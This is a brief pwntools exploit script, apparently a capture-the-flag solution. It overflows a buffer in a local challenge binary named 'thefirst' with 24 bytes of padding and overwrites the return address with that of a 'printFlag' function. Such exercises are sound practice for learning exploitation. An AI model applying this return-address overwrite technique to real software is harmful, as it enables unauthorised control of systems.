from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./thefirst"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x0
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 24
payload += p32(0x080491f6)    # printFlag

p.recvuntil("> ")
p.sendline(payload)

print(p.recvline())

#p.interactive()
